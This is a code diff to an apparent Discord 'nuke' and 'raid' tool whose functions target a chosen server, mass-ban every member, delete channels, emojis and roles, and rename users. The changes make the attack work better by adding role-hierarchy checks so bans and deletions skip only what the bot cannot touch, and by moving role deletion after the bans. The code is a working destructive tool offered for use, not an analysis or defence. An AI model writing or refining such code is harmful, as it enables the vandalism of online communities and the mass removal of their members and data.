@@ -290,6 +290,7 @@ async def Nuke():
         print(f'{Fore.LIGHTYELLOW_EX}------')
         for guild in client.guilds:
             if guild.id == server_id:
+                botacc = guild.get_member(client.user.id)
                 print('Discord server "{}" was selected as a target...'.format(guild.name))
                 print('------')
                 print('Before we start, is there a ban reason? (Leave blank for no reason)')
@@ -320,23 +321,11 @@ async def Nuke():
                         print(
                             f"{Fore.RED}[❌] {index}/{guildchannels} [CHANNEL NOT DELETED] {Fore.WHITE}{channel.name}{Fore.RED} in '{guild.name}' - {e}")
                 index = 0
-                guildroles = len(guild.roles)
-                for role in guild.roles:
-                    cooldown = random_cooldown(min_general, max_general)
-                    index += 1
-                    try:
-                        await role.delete()
-                        print(
-                            f"{Fore.LIGHTGREEN_EX}[✅] {index}/{guildroles} [ROLE DELETED] {Fore.WHITE}{role.name}{Fore.LIGHTGREEN_EX} in '{guild.name}'")
-                        await asyncio.sleep(cooldown)
-                    except Exception as e:
-                        print(
-                            f"{Fore.RED}[❌] {index}/{guildroles} [ROLE NOT DELETED] {Fore.WHITE}{role.name}{Fore.RED} in '{guild.name}' - {e}")
-                index = 0
                 guildmembers = len(guild.members)
                 for member in guild.members:
+                  index += 1
+                  if member.top_role < botacc.top_role:
                     cooldown = random_cooldown(min_ban, max_ban)
-                    index += 1
                     try:
                         await guild.ban(member, reason=ban_reason, delete_message_days=7)
                         print(
@@ -359,6 +348,20 @@ async def Nuke():
                     except Exception as e:
                         print(
                             f"{Fore.RED}[❌] {index}/{guildemojis} [EMOJI NOT DELETED] {Fore.WHITE}{emoji.name}{Fore.RED} in '{guild.name}' - {e}")
+                index = 0
+                guildroles = len(guild.roles)
+                for role in guild.roles:
+                  index += 1
+                  if role.position < botacc.top_role.position:
+                    cooldown = random_cooldown(min_general, max_general)
+                    try:
+                        await role.delete()
+                        print(
+                            f"{Fore.LIGHTGREEN_EX}[✅] {index}/{guildroles} [ROLE DELETED] {Fore.WHITE}{role.name}{Fore.LIGHTGREEN_EX} in '{guild.name}'")
+                        await asyncio.sleep(cooldown)
+                    except Exception as e:
+                        print(
+                            f"{Fore.RED}[❌] {index}/{guildroles} [ROLE NOT DELETED] {Fore.WHITE}{role.name}{Fore.RED} in '{guild.name}' - {e}")
         print(f'{Fore.LIGHTGREEN_EX}⚡All tasks completed⚡')
         input(f"\n{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nPress Enter to return to the main menu")
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -516,6 +519,7 @@ async def raid():
         print(f'{Fore.LIGHTYELLOW_EX}------')
         for guild in client.guilds:
             if guild.id == server_id:
+                botacc = guild.get_member(client.user.id)
                 print('Discord server "{}" was selected as a target...'.format(guild.name))
                 print('------')
                 servername = input(f"{Fore.LIGHTGREEN_EX}Please enter a guild name>> ")
@@ -550,8 +554,9 @@ async def raid():
                 usercount = len(guild.members)
                 count = 0
                 for user in guild.members:
+                  count += 1
+                  if user.top_role < botacc.top_role:
                     cooldown = random_cooldown(min_general, max_general)
-                    count += 1
                     if not client.user.id == user.id:
                       try:
                           await user.edit(nick=newnick)
